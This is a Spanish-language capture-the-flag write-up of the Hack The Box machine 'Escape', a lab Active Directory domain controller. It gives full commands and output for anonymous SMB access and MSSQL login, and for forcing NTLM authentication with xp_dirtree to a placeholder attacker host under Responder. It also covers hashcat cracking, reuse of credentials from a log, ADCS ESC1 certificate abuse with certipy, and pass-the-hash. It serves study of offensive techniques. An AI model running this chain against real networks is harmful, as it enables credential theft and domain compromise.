---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - AD
  - SQLServer
  - LLMNR_NBT-NS
  - LateralMovement
  - ADCSAbuse
  - Pass-The-Hash
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Identificación del sistema|Identificación del sistema]]
	- [[#Enumeración#Identificación de puertos|Identificación de puertos]]
	- [[#Enumeración#Enumeración de Active Directory|Enumeración de Active Directory]]
		- [[#Enumeración de Active Directory#SQL Server|SQL Server]]
- [[#Explotación|Explotación]]
	- [[#Explotación#LLMNR & NBT-NS Poisoning|LLMNR & NBT-NS Poisoning]]
		- [[#LLMNR & NBT-NS Poisoning#Crackeo con Hashcat|Crackeo con Hashcat]]
		- [[#LLMNR & NBT-NS Poisoning#Acceso con WinRM|Acceso con WinRM]]
	- [[#Explotación#Lateral Movement|Lateral Movement]]
		- [[#Lateral Movement#Acceso con WinRM|Acceso con WinRM]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Enumeración con WinPEAS|Enumeración con WinPEAS]]
	- [[#Escalada de Privilegios#Active Directory Certificate Services abuse (AD CS abuse)|Active Directory Certificate Services abuse (AD CS abuse)]]
		- [[#Active Directory Certificate Services abuse (AD CS abuse)#Pass-The-Hash|Pass-The-Hash]]

---
# Escape

![](Screenshots/Pasted%20image%2020260427133131.png)

>Máquina de Hack The Box llamada **Escape**, que simula un entorno de **Active Directory** con un **Domain Controller** expuesto.  
>La explotación comienza con acceso anónimo a recursos **SMB**, donde se obtienen credenciales desde un archivo accesible públicamente.  
>Con estas credenciales se accede a un servicio **MSSQL**, desde el cual se fuerza autenticación mediante técnicas de **LLMNR/NBT-NS Poisoning**, permitiendo capturar y crackear hashes NTLM.  
>Tras obtener acceso al sistema vía **WinRM**, se realiza movimiento lateral aprovechando credenciales encontradas en logs.  
>Finalmente, la escalada de privilegios se logra mediante abuso de **Active Directory Certificate Services (AD CS)**, permitiendo obtener un certificado como `Administrator` y comprometer completamente el dominio.

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.228.253
PING 10.129.228.253 (10.129.228.253) 56(84) bytes of data.
64 bytes from 10.129.228.253: icmp_seq=1 ttl=127 time=46.6 ms

--- 10.129.228.253 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 46.648/46.648/46.648/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Identificación de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.228.253 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49716/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49666,49689,49690,49706,49716 -sCV 10.129.228.253 -oN targeted
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-26 17:05:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-26T17:06:42+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-04-26T17:06:42+00:00; +7h59m59s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-26T16:58:55
|_Not valid after:  2056-04-26T16:58:55
|_ssl-date: 2026-04-26T17:06:42+00:00; +7h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-04-26T17:06:42+00:00; +7h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-26T17:06:42+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-26T17:06:02
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
```

LDAP + Kerberos + SMB → *Domain Controler*

- Dominio: `sequel.htb`
- Host: `DC`
- OS: `Windows 10 / Server 2019 Build 17763 x64`

```PowerShell
crackmapexec smb 10.129.228.253
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.228.253 sequel.htb`.
### Enumeración de Active Directory

Se procede a enumerar con `Null session`.

```PowerShell
crackmapexec smb 10.129.228.253 -u '' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\: 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Se prueba con el usuario `anonymous`.

```PowerShell
crackmapexec smb 10.129.228.253 -u 'anonymous' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\anonymous: 
SMB         10.129.228.253  445    DC               [+] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```

Se obtiene acceso a los directorios: `IPC$` y `Public`.

En el directorio `Public` se encuentra el archivo `SQL Server Procedures.pdf`. Donde se encuentra las credenciales: `PublicUser:GuestUserCantWrite1`.

Se comprueban las credenciales para `SMB` y `WinRM`.

```PowerShell
crackmapexec smb 10.129.228.253 -u 'PublicUser' -p 'GuestUserCantWrite1'
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1

crackmapexec winrm 10.129.228.253 -u 'PublicUser' -p 'GuestUserCantWrite1'
SMB         10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.228.253  5985   DC               [*] http://10.129.228.253:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.253  5985   DC               [-] sequel.htb\PublicUser:GuestUserCantWrite1
```

No tenemos acceso a `WinRM`.
#### SQL Server

El puerto `1433` está abierto (MSSQL). Hemos encontrado un PDF relacionado con SQL, es razonable intentar autenticación contra el servicio MSSQL usando las credenciales encontradas.

```PowerShell
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> SELECT @@version;
                                                                                                                                                                                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   
SQL (PublicUser  guest@master)> SELECT SYSTEM_USER;
             
----------   
PublicUser   
SQL (PublicUser  guest@master)> SELECT USER_NAME();
        
-----   
guest   
SQL (PublicUser  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   
tempdb   
model    
msdb     

SQL (PublicUser  guest@master)> USE master;
ENVCHANGE(DATABASE): Old Value: master, New Value: master
INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
SQL (PublicUser  guest@master)> SELECT * FROM sys.tables;
...
```

Se enumera la **BBDD** pero no se encuentra nada interesante.

Se prueba a ver si tenemos permisos de ejecución.

```PowerShell
SQL (PublicUser  guest@msdb)> xp_cmdshell whoami
ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

No tenemos permisos de ejecución.

---
## Explotación
### LLMNR & NBT-NS Poisoning

**LLMNR** y **NBT-NS** son protocolos de resolución de nombres usados cuando **DNS** falla.  Un atacante puede responder falsamente y forzar autenticación **NTLM**.

Este ataque es posible porque:
- **LLMNR/NBT-NS** están habilitados
- El sistema intenta autenticarse automáticamente

Máquina atacante:

```PowerShell
sudo responder -I tun0
```

Máquina víctima:

```PowerShell
SQL (PublicUser  guest@msdb)> xp_dirtree \\[ATTACKER_IP]\responder
subdirectory   depth   file   
------------   -----   ---- 
```

Se utiliza `xp_dirtree` para forzar al servidor a autenticarse contra nuestra máquina atacante.

Se recibe una respuesta del `Responder` con el **hash**.

```PowerShell
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:dea79ec063f4ce0a:D74F90C89F628FC0477DA478C096B187:010100000000000080ADC8A375D5DC013E88045F8B90702B0000000002000800460055005600350001001E00570049004E002D004B0046004E003800580036004C00370052004600370004003400570049004E002D004B0046004E003800580036004C0037005200460037002E0046005500560035002E004C004F00430041004C000300140046005500560035002E004C004F00430041004C000500140046005500560035002E004C004F00430041004C000700080080ADC8A375D5DC0106000400020000000800300030000000000000000000000000300000C56CE1538134681093DB47C61525F0FA46DBA5FC7CD1A670029A6E9AF70368180A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310037000000000000000000 
```
#### Crackeo con Hashcat

Se guarda en un archivo llamado `AB920_hash`.

```PowerShell
hashcat -m 5600 AB920_hash /usr/share/wordlists/rockyou.txt
SQL_SVC::sequel:dea79ec063f4ce0a:d74f90c89f628fc0477da478c096b187:010100000000000080adc8a375d5dc013e88045f8b90702b0000000002000800460055005600350001001e00570049004e002d004b0046004e003800580036004c00370052004600370004003400570049004e002d004b0046004e003800580036004c0037005200460037002e0046005500560035002e004c004f00430041004c000300140046005500560035002e004c004f00430041004c000500140046005500560035002e004c004f00430041004c000700080080adc8a375d5dc0106000400020000000800300030000000000000000000000000300000c56ce1538134681093db47c61525f0fa46dba5fc7cd1a670029a6e9af70368180a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100310037000000000000000000:REGGIE1234ronnie
```

Se obtienen las credenciales: `sql_svc:REGGIE1234ronnie`.

Se comprueba las credenciales para `SMB` y `WinRM`.

```PowerShell
crackmapexec smb 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie

crackmapexec winrm 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.228.253  5985   DC               [*] http://10.129.228.253:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

Nos podemos conectar mediante el protocolo `WinRM`.
#### Acceso con WinRM

```PowerShell
evil-winrm -i 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```
### Lateral Movement

Se encuentra en la ruta: `C:\SQLServer\Logs` un archivo llamado `ERRORLOG.BAK`.

Los logs de SQL Server pueden contener credenciales en texto plano debido a intentos de login fallidos.

```PowerShell
type ERRORLOG.BAK
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Se encuentras las credenciales: `Ryan.Cooper:NuclearMosquito3`.

Se comprueba las credenciales para `SMB` y `WinRM`.

```PowerShell
crackmapexec smb 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
SMB         10.129.228.253   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253   445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3

crackmapexec winrm 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
SMB         10.129.228.253   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.228.253   5985   DC               [*] http://10.129.228.253:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.253   5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
```

Nos podemos conectar mediante el protocolo `WinRM`.
#### Acceso con WinRM

```PowerShell
evil-winrm -i 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

La flag de `usuario` se encuentra en: `C:\Users\Ryan.Cooper\Desktop`.

---
## Escalada de Privilegios
### Enumeración con WinPEAS

Se usa [PEASS-ng](https://github.com/peass-ng/PEASS-ng).

Se descarga [winPEASx64](https://github.com/peass-ng/PEASS-ng/releases/download/20260422-9567fd62/winPEASx64.exe).

```PowerShell
upload winPEASx64.exe
.\winPEASx64.exe
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
 (T1649,T1552.004)                                                                                                                                                                                                                          
  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            :
  ValidDate          : 1/18/2024 3:03:57 PM
  ExpiryDate         : 1/5/2074 3:03:57 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : D88D12AE8A50FCF12242909E3DD75CFF92D1A480

  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=2
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
       Smart Card Logon
       KDC Authentication
   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            :
  ValidDate          : 11/18/2022 1:05:34 PM
  ExpiryDate         : 11/18/2023 1:05:34 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : B3954D2D39DCEF1A673D6AEB9DE9116891CE57B2

  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
       Smart Card Logon
       KDC Authentication
   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb
  ValidDate          : 11/18/2022 12:58:46 PM
  ExpiryDate         : 11/18/2121 1:08:46 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56

   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=dc.sequel.htb
  ValidDate          : 4/27/2026 10:20:49 AM
  ExpiryDate         : 4/27/2027 10:20:49 AM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 0DFBEBA601A219A67A4797A362E47957F22484C4

  Template           : DomainController
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
   =================================================================================================
```

Se observa:
- Certificados exportables (`KeyExportable: True`)
- Uso de plantillas vulnerables
### Active Directory Certificate Services abuse (AD CS abuse)

Se identifica una vulnerabilidad **ESC1** en Active Directory Certificate Services.
Esto permite:
- Especificar un UPN arbitrario
- Solicitar certificados como otro usuario
- Autenticarse sin conocer la contraseña

Se instala [Certipy](https://github.com/ly4k/Certipy) para poder realizar este ataque.

```PowerShell
git clone https://github.com/ly4k/Certipy.git
cd Certipy
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
certipy
```

Se solicita el certificado malicioso autenticándonos como `Ryan.Cooper`, pero pidiendo un certificado de `Administrador`.

```PowerShell
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target 10.129.228.253 -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
[+] Trying to connect to endpoint: ncacn_np:10.129.228.253[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.228.253[\pipe\cert]
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: 'dc.sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_dc.pfx'
[+] Attempting to write data to 'administrator_dc.pfx'
[+] Data written to 'administrator_dc.pfx'
[*] Wrote certificate and private key to 'administrator_dc.pfx'
```

Ahora, que ya tenemos el certificado para autenticarnos como **Kerberos** (`administrator_dc.pfx`), se obtiene un **TGT (Ticket Granting Ticket)**.

```PowerShell
certipy auth -pfx administrator_dc.pfx -dc-ip 10.129.228.253
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*]     SAN DNS Host Name: 'dc.sequel.htb'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'Administrator@sequel.htb' (Administrator@sequel.htb)
    [1] DNS Host Name: 'dc.sequel.htb' (dc$@sequel.htb)
> 0
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

Nos da error debido a que **Kerberos** requiere sincronización de tiempo (±5 min)

Se actualiza la hora local de la máquina con la hora de la máquina víctima.

```PowerShell
sudo ntpdate 10.129.228.253
```

Se vuelve a lanzar el comando.

```PowerShell
certipy auth -pfx administrator_dc.pfx -dc-ip 10.129.228.253
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*]     SAN DNS Host Name: 'dc.sequel.htb'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'Administrator@sequel.htb' (Administrator@sequel.htb)
    [1] DNS Host Name: 'dc.sequel.htb' (dc$@sequel.htb)
> 0
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Se obtiene el **hash NTLM** de `Administrador`.
#### Pass-The-Hash

Permite autenticarse usando el **hash NTLM** sin conocer la contraseña.

```PowerShell
evil-winrm -i 10.129.228.253 -u 'Administrator' -H a52f78e4c751e5f5e17e1e9f3e58f4ee
C:\Users\Administrator\Documents
```

La flag de `root` se encuentra en: `C:\Users\Administrator\Desktop`.

---